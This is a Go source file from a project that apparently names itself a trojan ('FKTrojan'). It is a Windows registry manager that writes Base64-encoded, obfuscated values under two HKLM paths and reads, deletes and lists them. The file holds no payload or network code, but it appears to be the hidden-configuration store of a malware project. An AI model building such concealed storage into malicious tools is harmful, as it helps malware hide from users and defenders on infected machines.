/*
Author: FreeKnight
注册表管理器
*/
//------------------------------------------------------------
package registry_crypto

//------------------------------------------------------------
import (
	"FKTrojan/common"

	"fmt"

	"golang.org/x/sys/windows/registry"
)

//------------------------------------------------------------
func getKey(typeReg registry.Key, regPath string, access uint32) (key registry.Key, err error) {
	currentKey, err := registry.OpenKey(typeReg, regPath, access)
	if err != nil {
	}
	return currentKey, err
}

//------------------------------------------------------------
func getKeyValue(typeReg registry.Key, regPath, nameKey string) (keyValue string, err error) {
	var value string = ""

	key, err := getKey(typeReg, regPath, registry.READ)
	if err != nil {
		return value, err
	}
	defer key.Close()

	value, _, err = key.GetStringValue(nameKey)
	if err != nil {
		return value, err
	}
	return value, nil
}

//------------------------------------------------------------
func checkSetValueKey(typeReg registry.Key, regPath, nameValue string) bool {
	currentKey, err := getKey(typeReg, regPath, registry.READ)
	if err != nil {
		return false
	}
	defer currentKey.Close()

	_, _, err = currentKey.GetStringValue(nameValue)
	if err != nil {
		return false
	}
	return true
}

//------------------------------------------------------------
func setKey(typeReg registry.Key, regPath, nameProgram, pathToExecFile string) error {
	updateKey, err := getKey(typeReg, regPath, registry.WRITE)
	if err != nil {
		return err
	}
	defer updateKey.Close()
	return updateKey.SetStringValue(nameProgram, pathToExecFile)
}

//------------------------------------------------------------
func delKey(typeReg registry.Key, regPath, nameProgram string) error {
	deleteKey, err := getKey(typeReg, regPath, registry.WRITE)
	if err != nil {
		return err
	}
	defer deleteKey.Close()
	return deleteKey.DeleteValue(nameProgram)
}

func createSetEncryptValue(regPath, key, value string) error {
	registry.CreateKey(registry.LOCAL_MACHINE, regPath, registry.ALL_ACCESS)
	return setKey(registry.LOCAL_MACHINE, regPath, key, common.Obfuscate(common.Base64Encode(value)))
}
func getDecryptValue(regPath, key string) (string, error) {
	value, err := getKeyValue(registry.LOCAL_MACHINE, regPath, key)
	if err != nil {
		return "", err
	}
	return common.Base64Decode(common.Deobfuscate(value)), nil
}
func Set(key RegistryKeyType, value string) error {
	regPath := []string{
		BASEPATH1,
		BASEPATH2,
	}
	for _, p := range regPath {
		err := createSetEncryptValue(p, string(key), value)
		if err != nil {
			return err
		}
	}
	return nil
}
func Get(key RegistryKeyType) (string, error) {
	regPath := []string{
		BASEPATH1,
		BASEPATH2,
	}
	for _, p := range regPath {
		value, err := getDecryptValue(p, string(key))
		if err == nil {
			return value, err
		}
	}
	return "", fmt.Errorf("cannot find %s key in all path", string(key))
}
func Del(key RegistryKeyType) error {
	regPath := []string{
		BASEPATH1,
		BASEPATH2,
	}
	for _, p := range regPath {
		delKey(registry.LOCAL_MACHINE, p, string(key))
	}
	return nil
}
func List() (map[string]string, error) {
	regPath := []string{
		BASEPATH1,
		BASEPATH2,
	}
	mapS := make(map[string]string)
	for _, p := range regPath {
		k, err := getKey(registry.LOCAL_MACHINE, p, registry.ENUMERATE_SUB_KEYS|registry.QUERY_VALUE)
		if err != nil {
			continue
		}
		func() {
			defer k.Close()
			n, err := k.ReadValueNames(-1)
			if err != nil {
				return
			}
			for _, v := range n {
				insideV, err := Get(RegistryKeyType(v))
				if err != nil {
					continue
				}
				mapS[v] = insideV
			}
		}()
	}
	return mapS, nil
}

//------------------------------------------------------------
